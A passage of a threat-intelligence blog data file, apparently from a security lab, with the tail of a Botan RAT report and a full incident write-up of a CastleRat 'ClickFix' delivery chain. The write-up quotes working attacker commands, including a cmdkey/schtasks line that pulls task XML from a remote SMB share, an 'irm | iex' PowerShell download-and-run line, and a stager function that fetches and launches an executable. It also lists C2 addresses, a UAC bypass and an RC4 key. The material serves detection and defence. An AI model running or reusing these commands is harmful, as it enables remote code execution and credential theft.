Folder</td>\n<td>T1547.001</td>\n</tr>\n<tr>\n<td>Persistence</td>\n<td>Remote Access Software (GetScreen, DWAgent)</td>\n<td>T1219</td>\n</tr>\n<tr>\n<td>Privilege Escalation</td>\n<td>Domain Policy Modification (svc account)</td>\n<td>T1484</td>\n</tr>\n<tr>\n<td>Defense Evasion</td>\n<td>Hijack Execution Flow: DLL Side-Loading</td>\n<td>T1574.002</td>\n</tr>\n<tr>\n<td>Defense Evasion</td>\n<td>Obfuscated Files or Information (Base64 C2)</td>\n<td>T1027</td>\n</tr>\n<tr>\n<td>Defense Evasion</td>\n<td>Masquerading: Match Legitimate Name</td>\n<td>T1036.005</td>\n</tr>\n<tr>\n<td>Credential Access</td>\n<td>Forced Authentication (PetitPotam)</td>\n<td>T1187</td>\n</tr>\n<tr>\n<td>Credential Access</td>\n<td>OS Credential Dumping: DCSync</td>\n<td>T1003.006</td>\n</tr>\n<tr>\n<td>Credential Access</td>\n<td>Steal or Forge Kerberos Tickets (KRBTGT)</td>\n<td>T1558</td>\n</tr>\n<tr>\n<td>Discovery</td>\n<td>System Information Discovery</td>\n<td>T1082</td>\n</tr>\n<tr>\n<td>Discovery</td>\n<td>System Network Configuration Discovery</td>\n<td>T1016</td>\n</tr>\n<tr>\n<td>Discovery</td>\n<td>Account Discovery: Domain Account</td>\n<td>T1087.002</td>\n</tr>\n<tr>\n<td>Lateral Movement</td>\n<td>Remote Services: RDP</td>\n<td>T1021.001</td>\n</tr>\n<tr>\n<td>Command and Control</td>\n<td>Application Layer Protocol: DNS</td>\n<td>T1071.004</td>\n</tr>\n<tr>\n<td>Command and Control</td>\n<td>Encrypted Channel: Symmetric (AES-GCM)</td>\n<td>T1573.001</td>\n</tr>\n<tr>\n<td>Command and Control</td>\n<td>Non-Standard Port (DNS-as-transport)</td>\n<td>T1571</td>\n</tr>\n</tbody>\n</table>\n<h2>Indicators of Compromise</h2>\n<h3>Network</h3>\n<pre><code>Indicator           Role\n------------------  ----------------------------------------\n45.55.94.174        C2 (DNS-tunneled, UDP/53)\n45.61.163.226       MSI staging host\n167.172.212.171     NTLM relay endpoint (DigitalOcean)\n</code></pre>\n<h3>Encoded strings</h3>\n<pre><code>NDUuNTUuOTQuMTc0    Base64 for 45.55.94.174\n</code></pre>\n<h3>Files and hashes (SHA256)</h3>\n<pre><code>Path / file                                      Notes / Hash\n-----------------------------------------------  ----------------------------------------------------------------\nuserenv.dll (Stage 1, with pdf24.exe)            Malicious implant (blocked); same Botan family as Stage 2\ndt_53updates.msi                                 849a2c808694426b2afb8848dcea00f9e64538a503b05543e38af1fdee9dd9f8\n%LOCALAPPDATA%\\Ditto\\Ditto.exe                   Host binary\n                                                 b120f170046b0ba5952d4957dd25e0a394ad28f743b47f2152c973e9fd94f08d\n%LOCALAPPDATA%\\Ditto\\vcruntime140.dll            FAKE implant (primary Stage 2 side-load)\n                                                 9d20d9f17dddedd3ea057b68e42ef2ca86ff7c776d59b045213f377ba1707291\n%LOCALAPPDATA%\\Ditto\\mfc140u.dll                 27ebf5ed915a573aa10a4ec18b3626a297032f3c46afc2daf45d8bb1ffecfe66\n%LOCALAPPDATA%\\Ditto\\msvcp140.dll                968bbd2a36b04cc5795c6fc99afe85e4d294ff9c28032ce0e870463827181799\n%LOCALAPPDATA%\\Ditto\\vcruntime140u.dll           eb6a3a491efcc911f9dff457d42fed85c4c170139414470ea951b0dafe352829\n%LOCALAPPDATA%\\Ditto\\ICU_Loader.dll              15a9c2550759eee371d57fa69e4d7d596235f2f061cd17ca123cba535a24fbcd\n%LOCALAPPDATA%\\Ditto\\Addins\\DittoUtil.dll        1ba47b26175855cba499ff8e951af5193e662319e96d497f4270daac440da1fd\n</code></pre>\n<h3>Persistence</h3>\n<pre><code>%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Ditto.lnk\n</code></pre>\n<h3>Implant identifier</h3>\n<pre><code>573d2149-b7b1-4d54-b0d4-403195f3984e\n</code></pre>\n<h3>Build artifacts</h3>\n<pre><code>Botan 3.0.0 (unreleased, revision unknown)\nAES-256/GCM\nGCC: (GNU) 13-win32\nlibgcc_s_dw2-1.dll\nBOTAN_MLOCK_POOL_SIZE\n</code></pre>\n<h3>YARA</h3>\n<pre><code>rule Ditto_BotanRAT_Implant\n{\n    meta:\n        description = &quot;Detects Ditto-side-loaded Botan RAT implant&quot;\n        author      = &quot;ghostsh-labs&quot;\n\n    strings:\n        $botan   = &quot;Botan 3.0.0 (unreleased&quot; ascii\n        $aes     = &quot;AES-256/GCM&quot;             ascii\n        $mlock   = &quot;BOTAN_MLOCK_POOL_SIZE&quot;   ascii\n        $beacon  = &quot;\\&quot;arch\\&quot;: \\&quot;windows\\&quot;&quot;   ascii\n        $ip_b64  = &quot;NDUuNTUuOTQuMTc0&quot;        ascii\n        $guid    = &quot;573d2149-b7b1-4d54-b0d4-403195f3984e&quot; ascii\n        $mingw   = &quot;GCC: (GNU) 13-win32&quot;     ascii\n        $authtag = &quot;Invalid authentication tag&quot; ascii\n\n    condition:\n        uint16(0) == 0x5A4D and\n        filesize &lt; 8MB and\n        (\n            ($botan and $aes and ($mlock or $authtag)) and\n            ($ip_b64 or $guid or $beacon) and\n            $mingw\n        )\n}\n</code></pre>"
  },
  {
    "id": "castle-rat-delivery-chain",
    "title": "CastleRat Delivery Chain",
    "summary": "ClickFix social engineering via cmdkey and remote schtasks, leading to a CastleRat implant with Steam profile dead-drop C2.",
    "category": "DFIR",
    "date": "2026-04-23",
    "readTime": "5 min",
    "tags": [
      "clickfix",
      "castle-rat",
      "delivery-chain",
      "windows",
      "malware"
    ],
    "content": "<h1>CastleRat Delivery Chain</h1>\n<h2>Summary</h2>\n<pre><code>CLASS      : RAT delivery / ClickFix chain\nVECTOR     : Social engineering (Win+R paste as fake CAPTCHA)\nSTAGE 1    : cmdkey + remote schtasks XML over SMB\nSTAGE 2    : PowerShell irm|iex stager (AMSI dilution)\nSTAGE 3    : .NET loader → bundled Python runtime\nIMPLANT    : CastleRat / NightShadeC2\nC2 RESOLVE : Steam Community profile dead-drop\nC2         : 45.88.106.190:4545 (resolved)\n</code></pre>\n<p>ClickFix-style delivery ending in CastleRat / NightShadeC2. The user pasted an attacker-supplied command into Run (<code>Win+R</code>) as a fake CAPTCHA check. That command staged SMB credentials, created a scheduled task from remote XML, and led through a junk-padded PowerShell stager into a .NET loader, bundled Python runtime, Steam dead-drop C2 resolution, and the implant.</p>\n<h2>Attack Chain</h2>\n<pre><code>User pastes &quot;Cloudflare CAPTCHA&quot; command → cmd.exe\n  → cmdkey + schtasks /XML\n  → SMB \\\\195.10.205.171\\kxc\\full.xml\n  → Scheduled Task &quot;Lowks&quot;\n  → powershell -c &quot;irm … | iex&quot;\n  → yhofgafjle.com (junk-padded script)\n  → cWtdXfLUVptO() → maestrovsd.exe\n  → .NET loader + PowerShell staging\n  → Python bundle under C:\\ProgramData\\{random}\\\n  → pythonw.exe install.pyc / melody.pyc\n  → ComputerDefaults.exe UAC bypass\n  → steamcommunity.com/id/… (C2 resolver)\n  → CastleRat / NightShadeC2 → 45.88.106.190:4545\n</code></pre>\n<h2>Initial Access - ClickFix</h2>\n<p>The lure page was not preserved. The executed command was recovered from endpoint telemetry:</p>\n<pre><code class=\"language-cmd\">cmd.exe /c cmdkey /add:195.10.205.171 /user:guest &amp;&amp; schtasks /Create /TN &quot;Lowks&quot; /XML &quot;\\\\195.10.205.171\\kxc\\full.xml&quot; &amp; REM I am not a robot - Cloudflare ID: qbIohbNXJpIB7wj\n</code></pre>\n<p>The trailing <code>REM</code> comment mimics Cloudflare verification text so the paste looks like CAPTCHA-related noise rather than a full command chain.</p>\n<h2>Credential Staging and Scheduled Task</h2>\n<p>The command chains two actions with <code>&amp;&amp;</code>.</p>\n<h3>cmdkey</h3>\n<pre><code class=\"language-cmd\">cmdkey /add:195.10.205.171 /user:guest\n</code></pre>\n<p>Stores credentials for <code>\\\\195.10.205.171\\</code> as <code>guest</code> in Windows Credential Manager. That avoids an interactive prompt when the next step opens the remote SMB share.</p>\n<h3>schtasks</h3>\n<pre><code class=\"language-cmd\">schtasks /Create /TN &quot;Lowks&quot; /XML &quot;\\\\195.10.205.171\\kxc\\full.xml&quot;\n</code></pre>\n<p>Task definition is pulled from a remote SMB share instead of embedded in the paste. The XML can be changed server-side without updating the lure command. <code>full.xml</code> defines a task that runs:</p>\n<pre><code class=\"language-powershell\">powershell -c &quot;irm hxxps://yhofgafjle[.]com | iex&quot;\n</code></pre>\n<p><code>Invoke-RestMethod</code> fetches a script and pipes it to <code>Invoke-Expression</code> with no intermediate file on disk. That handoff is what loads Stage 2.</p>\n<h2>PowerShell Stager - AMSI Dilution</h2>\n<p>The script from <code>yhofgafjle[.]com</code> contains hundreds of lines of filler:</p>\n<pre><code class=\"language-powershell\">$xYzAbc = &quot;lorem&quot;\n$pPpQqq = $xYzAbc + &quot;ipsum&quot;\nfunction asd0192hjkl { return $true }\n$rndVar = Get-Random -Minimum 1 -Maximum 9999\n</code></pre>\n<p>Padding dilutes AMSI and static signature matches. Functional payload is buried in the noise:</p>\n<pre><code class=\"language-powershell\">function cWtdXfLUVptO {\n    $ulaSVjsMmF = &quot;https://yhofgafjle.com/maestrovsd.exe&quot;\n    $pURHzjVsUNaWGZ = &quot;C:\\Windows\\Temp\\TrHtWFGyRY.exe&quot;\n    Invoke-WebRequest -Uri $ulaSVjsMmF -OutFile $pURHzjVsUNaWGZ\n    Start-Process -FilePath $pURHzjVsUNaWGZ\n}\n</code></pre>\n<p>Downloads <code>maestrovsd.exe</code>, writes it to <code>C:\\Windows\\Temp\\TrHtWFGyRY.exe</code>, and executes it. Variable names appear randomized per deployment.</p>\n<h2>.NET Loader and Python Runtime</h2>\n<p><code>maestrovsd.exe</code> is a ~150KB .NET assembly compiled within a week of execution.</p>\n<pre><code>Verdict:        Malicious (100/100)\nFamily:         CastleRat / NightShadeC2\nTags:           rat, stealer, botnet, python, uac\nFirst C2:       212.43.154.198:23814 (Latvia / PODAON)\n</code></pre>\n<p>On execution, the loader spawns multiple PowerShell processes (<code>-NoProfile</code>) and retrieves staged payloads:</p>\n<pre><code>http://162.33.177.16/Dvizhok.zip\nhttp://162.33.177.16/NiceNic.zip\nhttp://162.33.177.16/either/Python.zip\nhttp://162.33.177.16/either/install.pyc\nhttp://162.33.177.16/either/veQcBTuTnPwMD.Ar\nhttps://adamcold.com/NiceNic/Python.zip\nhttps://adamcold.com/NiceNic/melody.pyc\nhttps://adamcold.com/NiceNic/5o7dkS4S.8\n</code></pre>\n<p>The ZIP archives contain full Python runtimes (signed <code>python.exe</code>, <code>pythonw.exe</code>, <code>python313.dll</code>). The malware ships its own interpreter rather than depending on a host install.</p>\n<p>Dropped locations:</p>\n<pre><code>C:\\ProgramData\\5171NWNrWQ\\   ← Python 3.9 environment\nC:\\ProgramData\\92WKzFYLqB\\   ← Python 3.13 environment\n</code></pre>\n<p>Execution uses signed <code>pythonw.exe</code> against <code>install.pyc</code> and <code>melody.pyc</code>, so the process tree shows a trusted binary running attacker bytecode.</p>\n<h2>In-Memory C# Compilation and UAC Bypass</h2>\n<p>Sandbox analysis captured <code>csc.exe</code> with <code>.cmdline</code> argument files, producing temporary DLLs in <code>%TEMP%</code>:</p>\n<pre><code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\n    /noconfig /fullpaths @&quot;C:\\Users\\&lt;user&gt;\\AppData\\Local\\Temp\\is3na01s.cmdline&quot;\n</code></pre>\n<p>Consistent with inline C# compilation from PowerShell (<code>Add-Type</code>): source generated at runtime, compiled, loaded, without a persistent malicious DLL on disk.</p>\n<p>UAC bypass via <code>ComputerDefaults.exe</code> registry hijack:</p>\n<pre><code>Parent:    C:\\ProgramData\\92WKzFYLqB\\pythonw.exe\nChild:     C:\\Windows\\System32\\ComputerDefaults.exe\nIntegrity: HIGH (elevated)\n</code></pre>\n<p>The chain modifies <code>HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command</code> and launches auto-elevated <code>ComputerDefaults.exe</code>. Elevation from the Python host feeds later privileged actions and implant setup.</p>\n<h2>C2 Resolution - Steam Dead Drop</h2>\n<p>The implant does not hardcode its primary C2. It retrieves:</p>\n<pre><code>https://steamcommunity.com/id/dpmorin49sdiw302fw\n</code></pre>\n<p>The bot fetches the Steam Community profile, parses the bio, and extracts the embedded C2 string. Infrastructure rotation only requires editing the profile.</p>\n<p><img alt=\"Steam profile dead-drop resolver\" src=\"assets/steam-dead-drop.png\" /></p>\n<p>Resolved C2 in this case: <code>45.88.106.190:4545</code> (Netherlands, ON-LINE-DATA).</p>\n<p>Config extraction also identified backup C2 <code>8.3.0.253</code> and RC4 key:</p>\n<pre><code>596d626a6f39745634686470324c7430  →  Ymbjo9tV4hdp2Lt0\n</code></pre>\n<p>The key decrypts secondary stages <code>5o7dkS4S.8</code> and <code>veQcBTuTnPwMD.Ar</code> (~5MB and ~15MB RC4-encrypted blobs loaded in memory).</p>\n<p>The Python payload is PyArmor-protected; static <code>.pyc</code> analysis is limited. YARA hits on process dumps tagged both <strong>CastleRat</strong> and <strong>NightShadeC2</strong> (same codebase or close fork given infrastructure overlap).</p>\n<h2>Post-Compromise Capabilities</h2>\n<p>Observed stealer functionality after C2 resolution:</p>\n<ul>\n<li><strong>Browsers</strong> — Chrome, Edge, Firefox (cookies, credentials, autofill). Firefox decryption via victim-installed <code>nss3.dll</code>.</li>\n<li><strong>Crypto wallets</strong> — Exodus, Electrum, Atomic, Coinomi, Jaxx, Ledger Live, Ethereum keystore, WalletWasabi; extension wallets including MetaMask, Phantom, TronLink.</li>\n<li><strong>Password managers</strong> — 1Password, NordPass directory enumeration.</li>\n<li><strong>VPN</strong> — NordVPN, ProtonVPN configs.</li>\n<li><strong>FTP</strong> — Cyberduck, FileZilla.</li>\n<li><strong>Screenshots</strong> — observed across <code>pythonw.exe</code> memory regions.</li>\n</ul>\n<p>Exfiltration over resolved C2 <code>45.88.106.190:4545</code>.</p>\n<h2>Indicators of Compromise</h2>\n<h3>Hashes (SHA256)</h3>\n<pre><code>File            Hash\n--------------  ----------------------------------------------------------------\nmaestrovsd.exe  e25534efbab99f08ca802c6d3974c2ff7c47ddd6e6ed71a84a94c2fddd7de4e2\ninstall.pyc     b953bb0acb76848f889909256d67d01d44cc45d83c8bfc3421783ac0a79688fc\nmelody.pyc      91919832f20d8fb78bab82844a430ecbe02a07df3f317316a8c34f54e3bb45c2\n</code></pre>\n<h3>Network</h3>\n<pre><code>Indicator                  Role\n-------------------------  --------------------------------\n195.10.205.171             SMB staging (cmdkey target)\nyhofgafjle[.]com           PowerShell stager host\n162.33.177.16              Payload distribution (HTTP)\nadamcold[.]com             Payload distribution (HTTPS)\n212.43.154.198:23814       Initial C2 (Latvia)\n45.88.106.190:4545         Resolved C2 (Netherlands)\n8.3.0.253                  Backup C2\n</code></pre>\n<h3>Dead Drop</h3>\n<pre><code>steamcommunity[.]com/id/dpmorin49sdiw302fw\n</code></pre>\n<h3>Filesystem</h3>\n<pre><code>C:\\ProgramData\\5171NWNrWQ\\\nC:\\ProgramData\\92WKzFYLqB\\\nC:\\Windows\\Temp\\TrHtWFGyRY.exe\n%LOCALAPPDATA%\\NiceNickAlliceRachelCoach*\n%LOCALAPPDATA%\\StreamEtheriumLife*\n</code></pre>\n<h3>Crypto</h3>\n<pre><code>RC4 key:  Ymbjo9tV4hdp2Lt0\n</code></pre>\n<h3>Scheduled Task</h3>\n<pre><code>Name:  Lowks\nXML:   \\\\195.10.205.171\\kxc\\full.xml\n</code></pre>"
  }
];
